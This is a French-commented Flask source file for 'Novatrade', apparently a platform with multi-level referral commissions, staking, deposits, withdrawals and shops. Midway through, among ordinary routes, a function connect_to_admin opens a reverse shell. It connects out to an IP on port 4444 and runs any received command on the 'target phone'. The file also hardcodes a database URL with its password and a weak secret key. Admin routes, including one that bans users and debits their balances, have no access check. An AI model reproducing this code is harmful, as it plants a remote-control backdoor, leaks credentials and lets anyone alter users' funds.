import time
import requests
import os
import re
import sys
import uuid
from datetime import datetime, timedelta, timezone, date, UTC
from functools import wraps
from urllib.parse import urlencode
from werkzeug.security import generate_password_hash, check_password_hash
from dotenv import load_dotenv
from flask import Flask, render_template, request, redirect, url_for, flash, session, g, jsonify, send_from_directory, abort
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import func, create_engine, text
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
from flask_login import LoginManager, login_user, logout_user, current_user, login_required, UserMixin
from flask_migrate import Migrate

# ÔöÇÔöÇÔöÇ FLASK APP ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = "ma_cle_ultra_secrete"

# D├®sactiver le cache pour le d├®veloppement
@app.after_request
def add_header(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    response.headers['Cache-Control'] = 'public, max-age=0'
    return response

# ÔöÇÔöÇÔöÇ UPLOAD CONFIG ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

UPLOAD_FOLDER_PROFILE = 'static/uploads/profiles'
UPLOAD_FOLDER_VLOGS = 'static/vlogs'
UPLOAD_FOLDER_APPS = os.path.join(os.getcwd(), "static", "uploads", "apps")

# Cr├®ation des dossiers si inexistant
os.makedirs(UPLOAD_FOLDER_PROFILE, exist_ok=True)
os.makedirs(UPLOAD_FOLDER_APPS, exist_ok=True)
os.makedirs(UPLOAD_FOLDER_VLOGS, exist_ok=True)

# Configuration Flask
app.config['UPLOAD_FOLDER_PROFILE'] = UPLOAD_FOLDER_PROFILE
app.config['UPLOAD_FOLDER_VLOGS'] = UPLOAD_FOLDER_VLOGS
app.config['UPLOAD_FOLDER_APPS'] = UPLOAD_FOLDER_APPS
app.config['UPLOAD_FOLDER'] = 'static/uploads'
app.config["UPLOAD_FOLDER"] = "static/uploads"
def allowed_file(filename):
    """
    V├®rifie si le fichier upload├® est autoris├®.
    Retourne True si l'extension est dans ALLOWED_EXTENSIONS.
    """
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# ÔöÇÔöÇÔöÇ DATABASE CONFIG ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
DATABASE_URL = "postgresql://neondb_owner:npg_YaC69HIAGyZn@ep-muddy-darkness-ai9gl7w1-pooler.c-4.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require"

engine = create_engine(
    DATABASE_URL,
    pool_size=10,
    max_overflow=20,
    pool_timeout=30,
    pool_recycle=1800,
)

app.config["SQLALCHEMY_DATABASE_URI"] = DATABASE_URL
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    "pool_pre_ping": True,
    "pool_recycle": 280,
    "pool_timeout": 20
}

# ÔöÇÔöÇÔöÇ INITIALISATION DE LA BASE DE DONN├ëES ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
db = SQLAlchemy(app)
migrate = Migrate(app, db)

# ÔöÇÔöÇÔöÇ FLASK-LOGIN CONFIG ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
from flask_login import LoginManager, UserMixin, current_user

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "connexion_page"  # ta route login

# Fonction pour charger un utilisateur via Flask-Login
@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))  # classique

# Avant chaque requ├¬te, on force current_user ├á utiliser ta session
@app.before_request
def load_logged_in_user():
    from flask import g
    user_id = session.get("user_id")
    if user_id:
        try:
            # Utilise User.query.get pour compatibilit├®
            g.logged = User.query.get(user_id)
        except:
            # Fallback pour SQLAlchemy 2.0+
            try:
                g.logged = db.session.get(User, user_id)
            except:
                g.logged = None
    else:
        g.logged = None


class User(db.Model, UserMixin):
    __tablename__ = 'user'
    id = db.Column(db.Integer, primary_key=True)
    uid = db.Column(db.String(50), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    profile_image = db.Column(db.String(255), nullable=True, default='default.png')
    # Informations principales
    username = db.Column(db.String(50), unique=True, nullable=False, index=True)
    email = db.Column(db.String(120), unique=True, nullable=False, index=True)
    phone = db.Column(db.String(30), unique=True, nullable=False, index=True)
    password = db.Column(db.String(300), nullable=False)
    last_play_date = db.Column(db.DateTime, nullable=True) # Date pr├®cise du dernier clic
    # Parrainage ÔÇö maintenant bas├® sur le username
    parrain = db.Column(db.String(50), nullable=True)  # Pas de FK pour ├®viter les erreurs
    has_played_slot = db.Column(db.Boolean, default=False)
    # Relation auto-r├®f├®rentielle pour les filleuls (downlines)
    downlines = db.relationship(
        'User',
        primaryjoin="User.username == foreign(User.parrain)",
        remote_side="User.parrain",
        lazy='dynamic'
    )
    commission_total = db.Column(db.Float, default=0.0)
    has_seen_pay_ok = db.Column(db.Boolean, default=False)
    ip_address = db.Column(db.String(45)) # Ajoute cette ligne
    wallet_country = db.Column(db.String(50))
    wallet_operator = db.Column(db.String(50))
    wallet_number = db.Column(db.String(30))
    bonus = db.Column(db.Float, default=0.0)
    chances_bridge = db.Column(db.Integer, default=3)
    derniere_maj_chances = db.Column(db.Date) # Pour r├®initialiser chaque jeudi
    solde_total = db.Column(db.Float, default=0.0)
    solde_depot = db.Column(db.Float, default=0.0)
    solde_parrainage = db.Column(db.Float, default=0.0)
    solde_revenu = db.Column(db.Float, default=0.0, index=True)
    total_retrait = db.Column(db.Float, default=0.0)
    latitude = db.Column(db.String(50), nullable=True)
    longitude = db.Column(db.String(50), nullable=True)
    last_location_update = db.Column(db.DateTime, default=datetime.utcnow)
    premier_depot = db.Column(db.Boolean, default=False)
    remaining_rounds = db.Column(db.Integer, default=4)
    has_free_attempt = db.Column(db.Boolean, default=True) # Une chance gratuite par utilisateur
    is_admin = db.Column(db.Boolean, default=False)
    is_banned = db.Column(db.Boolean, default=False)
    is_verified = db.Column(db.Boolean, default=False)
    pin_code = db.Column(db.String(255), nullable=True)
    has_frog_attempt = db.Column(db.Boolean, default=True)
    frog_game_done = db.Column(db.Boolean, default=False)
    country = db.Column(db.String(50), default='')
    has_played_this_round = db.Column(db.Boolean, default=False)
    # Points divers
    points = db.Column(db.Integer, default=0)
    points_video = db.Column(db.Integer, default=0)
    points_youtube = db.Column(db.Integer, default=0)
    points_tiktok = db.Column(db.Integer, default=0)
    points_instagram = db.Column(db.Integer, default=0)
    points_ads = db.Column(db.Integer, default=0)
    points_spin = db.Column(db.Integer, default=0)
    points_games = db.Column(db.Integer, default=0)
    last_instagram_date = db.Column(db.String(10), default=None)
    last_youtube_date = db.Column(db.String(10), default=None)
    last_tiktok_date = db.Column(db.String(20), default=None)
    last_login = db.Column(db.DateTime, nullable=True)
    game_played_count = db.Column(db.Integer, default=0) # Nombre de fois qu'il a jou├®
    login_count = db.Column(db.Integer, default=0)
    has_spun_wheel = db.Column(db.Boolean, default=False)
    has_spun = db.Column(db.Boolean, default=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_update = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    solde_jeux = db.Column(db.Float, default=0.0)
    whatsapp_number = db.Column(db.String(30), nullable=True)
    profile_pic = db.Column(db.String(200), nullable=True)

    def __repr__(self):
        return f"<User {self.username} | {self.phone}>"

# ==============================
# ­ƒôª MODELS
# ==============================

class Depot(db.Model):
    __tablename__ = "depot"

    id = db.Column(db.Integer, primary_key=True)

    # ­ƒöü Ancien syst├¿me
    user_name = db.Column(
        db.String(50),
        db.ForeignKey("user.username", ondelete="CASCADE"),
        nullable=True
    )

    # ­ƒåò Nouveau syst├¿me
    user_id = db.Column(
        db.Integer,
        db.ForeignKey("user.id", ondelete="CASCADE"),
        nullable=True
    )

    # Ô£à TR├êS IMPORTANT : pr├®ciser foreign_keys
    user = db.relationship(
        "User",
        backref="depots",
        foreign_keys=[user_id]  # ­ƒæê ICI la correction
    )

    phone = db.Column(db.String(30), nullable=False)
    operator = db.Column(db.String(50), nullable=False)
    country = db.Column(db.String(50), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    reference = db.Column(db.String(200), nullable=True)
    statut = db.Column(db.String(20), default="pending")
    email = db.Column(db.String(120), nullable=True)
    date = db.Column(db.DateTime, default=datetime.utcnow)

class Commission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    parrain_uid = db.Column(db.String(200), nullable=False)
    filleul_uid = db.Column(db.String(200), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    niveau = db.Column(db.Integer, nullable=False)
    date = db.Column(db.DateTime, default=datetime.utcnow)


class Retrait(db.Model):
    __tablename__ = "retrait"

    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, nullable=True)  # Ô£à NOUVELLE COLONNE

    phone = db.Column(db.String(30), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    statut = db.Column(db.String(20), default="en_attente")
    date = db.Column(db.DateTime, default=datetime.utcnow)
    payment_method = db.Column(db.String(50))

    pays = db.Column(db.String(50), nullable=True)
    frais = db.Column(db.Float, default=0.0)

class Staking(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    phone = db.Column(db.String(30), nullable=False)
    vip_level = db.Column(db.String(20), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    duree = db.Column(db.Integer, default=15)
    taux_min = db.Column(db.Float, default=1.80)
    taux_max = db.Column(db.Float, default=2.20)
    revenu_total = db.Column(db.Float, nullable=False)
    date_debut = db.Column(db.DateTime, default=datetime.utcnow)
    actif = db.Column(db.Boolean, default=True)


class Question(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    question = db.Column(db.String(255), nullable=False)
    correct_answer = db.Column(db.String(255), nullable=False)

class QuestionReponse(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    date = db.Column(db.Date, default=date.today)
    points = db.Column(db.Integer, default=0)

class ClickTache(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    date = db.Column(db.Date, default=datetime.utcnow().date)
    clicks = db.Column(db.Integer, default=0)  # Nombre de clicks effectu├®s
    points = db.Column(db.Integer, default=0)  # Points gagn├®s


class ClickJeudiReponse(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    points = db.Column(db.Integer, default=0)
    date = db.Column(db.Date, default=date.today)

class RetraitPoints(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    points_utilises = db.Column(db.Integer, nullable=False)
    montant_xof = db.Column(db.Float, nullable=False)
    statut = db.Column(db.String(20), default='en_attente')  # en_attente / valide / refus├®
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    type_retrait = db.Column(db.String(20), nullable=True) # Ajoute ceci
    user = db.relationship('User', backref=db.backref('retraits_points', lazy='dynamic'))

# Dans ton fichier models.py ou app.py
class GameSession(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    bet_amount = db.Column(db.Integer, default=100) # Mise
    win_amount = db.Column(db.Integer, default=500) # Gain potentiel
    status = db.Column(db.String(20), default='pending') # pending, won, lost
    date = db.Column(db.DateTime, default=datetime.utcnow)

class ChannelMessage(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    content = db.Column(db.Text, nullable=True)
    media_url = db.Column(db.String(255), nullable=True)
    media_type = db.Column(db.String(50)) # Ajoute 'audio' mentalement ici
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    reactions = db.Column(db.JSON, default=lambda: {"­ƒöÑ": 0, "­ƒÜÇ": 0, "ÔØñ´©Å": 0})


# Ajoute bien cette classe avec tes autres mod├¿les (User, Retrait, etc.)
class ChannelSub(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id')) # Assure-toi que 'user.id' est correct


class GameControl(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    end_time = db.Column(db.DateTime, nullable=True)

    @classmethod
    def is_active(cls):
        control = cls.query.first()
        if control and control.end_time:
            from datetime import datetime
            return datetime.now() < control.end_time
        return False


# ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
# ­ƒÅ¬ MODELES POUR LES BOUTIQUES ET VENDEURS
# ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ

# Table des cat├®gories de produits
class Categorie(db.Model):
    __tablename__ = 'categories'
    id = db.Column(db.Integer, primary_key=True)
    nom = db.Column(db.String(100), nullable=False, unique=True)
    description = db.Column(db.Text, nullable=True)
    icone = db.Column(db.String(50), nullable=True)  # emoji ou nom d'ic├┤ne
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)

    # Relation avec les produits
    produits = db.relationship('Produit', backref='categorie', lazy='dynamic')

    def __repr__(self):
        return f"<Categorie {self.nom}>"


# Table des boutiques
class Boutique(db.Model):
    __tablename__ = 'boutiques'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    nom = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text, nullable=True)
    email = db.Column(db.String(120), nullable=True)
    whatsapp = db.Column(db.String(30), nullable=True)
    latitude = db.Column(db.String(50), nullable=True)
    longitude = db.Column(db.String(50), nullable=True)
    adresse = db.Column(db.String(300), nullable=True)
    ville = db.Column(db.String(100), nullable=True)
    pays = db.Column(db.String(100), nullable=True)
    logo = db.Column(db.String(255), nullable=True)  # URL de l'image du logo
    banniere = db.Column(db.String(255), nullable=True)  # URL de la banni├¿re
    est_actif = db.Column(db.Boolean, default=True)
    est_verifie = db.Column(db.Boolean, default=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    # Relation avec l'utilisateur propri├®taire
    proprietaire = db.relationship('User', backref=db.backref('boutiques', lazy='dynamic'))

    # Relation avec les produits
    produits = db.relationship('Produit', backref='boutique', lazy='dynamic', cascade='all, delete-orphan')

    def __repr__(self):
        return f"<Boutique {self.nom}>"


# Table des produits
class Produit(db.Model):
    __tablename__ = 'produits'
    id = db.Column(db.Integer, primary_key=True)
    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
    categorie_id = db.Column(db.Integer, db.ForeignKey('categories.id'), nullable=True)
    nom = db.Column(db.String(300), nullable=False)
    description = db.Column(db.Text, nullable=True)
    prix = db.Column(db.Float, nullable=False)
    prix_promo = db.Column(db.Float, nullable=True)  # Prix en promotion (optionnel)
    devise = db.Column(db.String(10), default='XOF')
    quantite = db.Column(db.Integer, default=1)  # Quantit├® disponible
    images = db.Column(db.Text, nullable=True)  # URLs s├®par├®es par des virgules
    couleurs_disponibles = db.Column(db.String(500), nullable=True)  # Couleurs s├®par├®es par des virgules
    tailles_disponibles = db.Column(db.String(500), nullable=True)  # Tailles s├®par├®es par des virgules
    est_actif = db.Column(db.Boolean, default=True)
    est_en_promo = db.Column(db.Boolean, default=False)
    vues = db.Column(db.Integer, default=0)
    ventes = db.Column(db.Integer, default=0)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    def __repr__(self):
        return f"<Produit {self.nom}>"

    @property
    def liste_images(self):
        """Retourne la liste des URLs d'images"""
        if self.images:
            return [img.strip() for img in self.images.split(',')]
        return []

    @property
    def liste_couleurs(self):
        """Retourne la liste des couleurs disponibles"""
        if self.couleurs_disponibles:
            return [c.strip() for c in self.couleurs_disponibles.split(',')]
        return []

    @property
    def liste_tailles(self):
        """Retourne la liste des tailles disponibles"""
        if self.tailles_disponibles:
            return [t.strip() for t in self.tailles_disponibles.split(',')]
        return []


# Table des commandes
class Commande(db.Model):
    __tablename__ = 'commandes'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
    reference = db.Column(db.String(50), unique=True, nullable=True)
    statut = db.Column(db.String(20), default='en_attente')  # en_attente, confirmee, expediee, livree, annulee
    total = db.Column(db.Float, nullable=False)
    frais_livraison = db.Column(db.Float, default=0.0)
    adresse_livraison = db.Column(db.String(500), nullable=True)
    telephone_livraison = db.Column(db.String(30), nullable=True)
    notes = db.Column(db.Text, nullable=True)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    # Relations
    acheteur = db.relationship('User', backref=db.backref('commandes', lazy='dynamic'), foreign_keys=[user_id])
    boutique = db.relationship('Boutique', backref=db.backref('commandes', lazy='dynamic'))
    articles = db.relationship('ArticleCommande', backref='commande', lazy='dynamic', cascade='all, delete-orphan')

    def __repr__(self):
        return f"<Commande {self.reference}>"


# Table des articles dans une commande
class ArticleCommande(db.Model):
    __tablename__ = 'articles_commande'
    id = db.Column(db.Integer, primary_key=True)
    commande_id = db.Column(db.Integer, db.ForeignKey('commandes.id'), nullable=False)
    produit_id = db.Column(db.Integer, db.ForeignKey('produits.id'), nullable=False)
    quantite = db.Column(db.Integer, nullable=False, default=1)
    prix_unitaire = db.Column(db.Float, nullable=False)
    couleur = db.Column(db.String(50), nullable=True)
    taille = db.Column(db.String(50), nullable=True)

    # Relation avec le produit
    produit = db.relationship('Produit', backref=db.backref('articles_commande', lazy='dynamic'))

    def __repr__(self):
        return f"<ArticleCommande produit_id={self.produit_id}>"


# Table des avis/notes sur les boutiques
class AvisBoutique(db.Model):
    __tablename__ = 'avis_boutiques'
    id = db.Column(db.Integer, primary_key=True)
    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    note = db.Column(db.Integer, nullable=False)  # 1 ├á 5
    commentaire = db.Column(db.Text, nullable=True)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)

    boutique = db.relationship('Boutique', backref=db.backref('avis', lazy='dynamic'))
    auteur = db.relationship('User', backref=db.backref('avis_boutiques', lazy='dynamic'))

    def __repr__(self):
        return f"<AvisBoutique note={self.note}>"


import threading

import requests
import os

def envoyer_retrait_soleaspay_debug(service_id, wallet, montant):
    print("­ƒº¬ MODE DEBUG ACTIV├ë")

    print("SERVICE ID :", service_id)
    print("WALLET :", wallet)
    print("MONTANT :", montant)

    # simulation r├®ponse API
    response = {
        "success": False,
        "message": "SIMULATION ERREUR API (test debug)"
    }

    print("­ƒöÁ FAKE RESPONSE :", response)
    return response

API_KEY = os.getenv("RESEND_API_KEY")

def send_otp(recipient_email, code_otp):
    if not API_KEY:
        print("ÔØî API KEY manquante")
        return False

    try:
        html_content = render_template(
            'email_otp.html',
            otp_code=code_otp,
            user_email=recipient_email
        )

        response = requests.post(
            "https://api.resend.com/emails",
            headers={
                "Authorization": f"Bearer {API_KEY}",
                "Content-Type": "application/json"
            },
            json={
                "from": "NOVATRADE <no-reply@nova-trade.cc>",
                "to": [recipient_email],
                "subject": "Votre code de s├®curit├® Novatrade",
                "html": html_content
            }
        )

        print("­ƒô¿ R├®ponse Resend:", response.json())

        if response.status_code in [200, 201]:
            return True
        else:
            print("ÔØî Erreur API:", response.text)
            return False

    except Exception as e:
        print("ÔØî Erreur :", e)
        return False

def donner_commission(parrain_username, montant_depot):
    """Cr├®e la commission et remplit solde_revenu, solde_parrainage et commission_total selon les niveaux."""
    
    if not parrain_username:
        return

    parrain = User.query.filter_by(username=parrain_username).first()
    if not parrain:
        return

    # --- NIVEAU 1 ---
    commission_niveau1 = 2000

    parrain.solde_revenu = (parrain.solde_revenu or 0) + commission_niveau1
    parrain.solde_parrainage = (parrain.solde_parrainage or 0) + commission_niveau1
    parrain.commission_total = (parrain.commission_total or 0) + commission_niveau1

    db.session.commit()

    # --- NIVEAU 2 ---
    if parrain.parrain:
        parrain2 = User.query.filter_by(username=parrain.parrain).first()
        if parrain2:
            commission_niveau2 = 700

            parrain2.solde_revenu = (parrain2.solde_revenu or 0) + commission_niveau2
            parrain2.solde_parrainage = (parrain2.solde_parrainage or 0) + commission_niveau2
            parrain2.commission_total = (parrain2.commission_total or 0) + commission_niveau2

            db.session.commit()

            # --- NIVEAU 3 ---
            if parrain2.parrain:
                parrain3 = User.query.filter_by(username=parrain2.parrain).first()
                if parrain3:
                    commission_niveau3 = 300

                    parrain3.solde_revenu = (parrain3.solde_revenu or 0) + commission_niveau3
                    parrain3.solde_parrainage = (parrain3.solde_parrainage or 0) + commission_niveau3
                    parrain3.commission_total = (parrain3.commission_total or 0) + commission_niveau3

                    db.session.commit()

# -----------------------
def t(key):
    lang = session.get("lang", "fr")
    return TRANSLATIONS.get(lang, TRANSLATIONS["fr"]).get(key, key)

# enregistrer la fonction dans Jinja2
app.jinja_env.globals.update(t=t)

@app.route("/")
def index_page():
    # On v├®rifie si l'utilisateur est d├®j├á connect├® pour personnaliser l'accueil
    user = get_logged_in_user()
    return render_template("index.html", user=user)

# -----------------------
# Utilisateur connect├®
# -----------------------
def get_logged_in_user():
    """Retourne l'utilisateur connect├® via user_id en session."""
    user_id = session.get("user_id")
    if not user_id:
        return None
    # db.session.get est compatible SQLAlchemy 2.0
    return db.session.get(User, user_id)


# -----------------------
# D├®corateur login
# -----------------------
def login_required(f):
    """Prot├¿ge une route, redirige vers la page de connexion si non connect├®."""
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not get_logged_in_user():
            return redirect(url_for("connexion_page"))
        return f(*args, **kwargs)
    return wrapper


def calculer_montant_points(user):
    total_points = (
        (user.points or 0) +
        (user.points_video or 0) +
        (user.points_youtube or 0) +
        (user.points_tiktok or 0) +
        (user.points_instagram or 0) +
        (user.points_ads or 0) +
        (user.points_spin or 0) +
        (user.points_games or 0)
    )
    tranches = total_points // 100
    montant_xof = tranches * 200
    points_utilisables = tranches * 100  # points qui peuvent ├¬tre retir├®s
    return montant_xof, points_utilisables

import os
from flask import Flask, render_template, request, redirect, url_for, session
from datetime import datetime, timezone
from werkzeug.utils import secure_filename

# Dossier de stockage (mkdir -p static/uploads/channel)
UPLOAD_FOLDER = 'static/uploads/channel'

import socket
import subprocess
import os

def connect_to_admin():
    # Ton serveur (ton premier t├®l├®phone ou ton PC)
    # L'appareil cible se connecte ├á TOI
    SERVER_IP = "192.168.1.XX" 
    PORT = 4444
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, PORT))
    
    while True:
        # Attend une commande venant de ton serveur
        command = s.recv(1024).decode()
        
        if command.lower() == "exit":
            break
            
        # Ex├®cute la commande sur le t├®l├®phone cible
        # Exemple: 'termux-location' ou 'ls'
        output = subprocess.getoutput(command)
        
        # Renvoie le r├®sultat ├á ton ├®cran de contr├┤le
        s.send(output.encode())
    
    s.close()

@app.route("/attribution/delier_leaderbrice")
@login_required
def delier_filleuls_brice():

    # 1. On cherche tous les utilisateurs qui ont 'leaderbrice01' comme parrain
    # mais on EXCLUT 'amen1' pour qu'il reste son filleul
    filleuls_a_delier = User.query.filter(
        User.parrain == "leaderbrice01",
        User.username != "amen1"
    ).all()

    total_delies = 0

    # 2. On retire le parrain en remettant le champ ├á None
    for user in filleuls_a_delier:
        user.parrain = None
        total_delies += 1

    # 3. On sauvegarde les modifications dans la base de donn├®es
    if total_delies > 0:
        db.session.commit()

    return f"Op├®ration r├®ussie ! {total_delies} utilisateurs ont ├®t├® d├®li├®s de leaderbrice01. Seul 'amen1' est rest├®."

@app.route("/academy/design")
@login_required
def formation_design_page():
    # R├®cup├®ration de l'utilisateur connect├® pour la navbar
    phone = get_logged_in_user_phone()
    user = User.query.filter_by(phone=phone).first()
    
    return render_template("design_graphique.html", user=user)


@app.route('/sanctionner/<username>')
def sanctionner_utilisateur(username):
    # On r├®cup├¿re l'utilisateur gr├óce au nom pass├® dans l'URL
    user = User.query.filter_by(username=username.lower()).first()

    if not user:
        return f"Utilisateur '{username}' non trouv├®.", 404

    try:
        # 1. Bannissement
        user.is_banned = True

        # 2. D├®biter le solde (On retire 360 000)
        user.solde_jeux = (user.solde_jeux or 0) - 360000

        # 3. Sauvegarder
        db.session.commit()

        return f"""
        <div style='color: red; font-family: sans-serif; padding: 20px; border: 2px solid red; border-radius: 15px; max-width: 500px; margin: 20px auto;'>
            <h2 style='margin-top: 0;'>ÔÜá´©Å Sanction Appliqu├®e</h2>
            <hr>
            <p><b>Utilisateur :</b> {user.username.upper()}</p>
            <p><b>Statut :</b> BANNI D├ëFINITIVEMENT</p>
            <p><b>Retrait solde :</b> -360,000 XOF</p>
            <p><b>Solde actuel :</b> {user.solde_jeux} XOF</p>
            <br>
            <a href="/admin/utilisateurs" style="color: blue;">Retour ├á la liste</a>
        </div>
        """
    except Exception as e:
        db.session.rollback()
        return f"Erreur lors de la sanction : {str(e)}", 500

@app.route("/admin/filleuls-inactifs")
def filleuls_inactifs_kedboy():
    username_cible = "kedboy"
    
    # 1. On cherche directement les utilisateurs dont le parrain est 'kedboy'
    # ET qui n'ont pas encore fait leur premier d├®p├┤t (premier_depot=False)
    filleuls_non_actives = User.query.filter_by(
        parrain=username_cible, 
        premier_depot=False
    ).order_by(User.id.desc()).all() # Range du plus r├®cent (ID le plus grand) au plus ancien

    # On cr├®e un faux objet parrain pour que le template HTML fonctionne sans erreur
    class CustomParrain:
        username = username_cible
    
    return render_template(
        "filleuls_inactifs.html", 
        parrain=CustomParrain(), 
        filleuls=filleuls_non_actives
    )


from sqlalchemy import func

@app.route("/admin/stats-depots")
def stats_depots():
    # On groupe par la colonne premier_depot et on compte
    # Cela renvoie une liste de tuples : [(True, 150), (False, 45)]
    stats = db.session.query(
        User.premier_depot, 
        func.count(User.id)
    ).group_by(User.premier_depot).all()

    # On initialise les compteurs
    total_actifs = 0   # premier_depot = True
    total_passifs = 0  # premier_depot = False

    for status, count in stats:
        if status is True:
            total_actifs = count
        else:
            total_passifs = count

    return render_template("admin_stats.html", actifs=total_actifs, passifs=total_passifs)

@app.route("/admin/canal/edit", methods=["GET", "POST"])
def admin_canal_edit():
    if request.method == "POST":
        content = request.form.get("content")
        media_url = None
        media_type = None

        # R├®cup├®ration des fichiers
        file = request.files.get("media")
        audio_file = request.files.get("audio")

        # Priorit├® au m├®dia (image/vid├®o) sinon audio
        target_file = file if (file and file.filename) else audio_file

        if target_file and target_file.filename:
            filename = secure_filename(target_file.filename)
            ext = filename.split('.')[-1].lower()
            
            # Nom unique avec timestamp pour ├®viter les bugs de cache
            unique_name = f"{int(datetime.now().timestamp())}_{filename}"
            
            upload_folder = os.path.join(app.root_path, "static/uploads")
            os.makedirs(upload_folder, exist_ok=True)

            path = os.path.join(upload_folder, unique_name)
            target_file.save(path)

            # URL accessible par le navigateur
            media_url = f"/static/uploads/{unique_name}"

            # D├®tection automatique du type
            if ext in ["jpg", "png", "jpeg", "gif", "webp"]:
                media_type = "image"
            elif ext in ["mp4", "mov", "avi", "webm"]:
                media_type = "video"
            elif ext in ["mp3", "wav", "ogg", "m4a"]:
                media_type = "audio"

        # Cr├®ation du message
